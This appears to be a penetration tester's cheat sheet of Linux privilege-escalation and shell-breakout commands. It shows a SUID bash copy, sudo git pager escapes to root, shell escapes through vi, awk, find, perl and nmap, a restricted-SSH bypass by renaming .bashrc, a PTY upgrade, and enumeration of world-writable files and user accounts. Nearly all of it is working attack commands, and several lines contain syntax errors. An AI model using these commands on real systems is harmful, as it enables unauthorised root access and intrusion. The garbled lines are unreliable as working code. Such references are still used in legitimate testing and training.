```bash
# [Interesting]
sh -c 'cp ${which bash} .; chmod +s ./bash'
./bash -p
```

```bash
sudo git -p --help
!/bin/bash
# Old Pagination root Privilege Escalation

# New Pagination ...
sudo git -p help config
!/bin/sh
```

```bash
# From within Vi:
:set shell=/bin/sh
:shell

# From within IRB:
exec "/bin/sh"

# [awk]
awk 'BEGIN {system{"/bin/bash"}}'

# [find]
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash)}' \;

# [perl]
perl -e 'exec "/bin/bash";'

# For this method, find which bin file 'awk' is in
find / -name udev -exec /usr/bin/awk 'BEGIN {system("/bin/bash -i")}' \;
```

```bash
# [Jailed SSH Shell? Try this...]
# Initial Shell /bin/sh
# If BASH is blocked
# Check the 'env' variable!
# Linux will default to bin/bash default bashrc if htere is no present .bashrc file in a User's home directory. Legit shell.

# 
ssh user@127.0.0.1 "/bin/sh"
# 
cd $HOME
# 
mv .bashrc .bashrc.BAK
# 
exit
# 
ssh user@127.0.0.1
# 
# user@Target:~$
```

```bash
# [Export PATH]
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='clear ; ls -lsaht --color=auto'
# Ctrl + Z (Background Process)
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```

```bash
# [Once Broken Out - Before PrivEsc Reference - Perform These Commands...]
find / -perm -2 ! -type l -ls 2>/dev/null |sort -r

grep -vE "nologin|false" /etc/passwd
```

```bash
# [Misc]
nmap --interactive
nmap> !sh
```



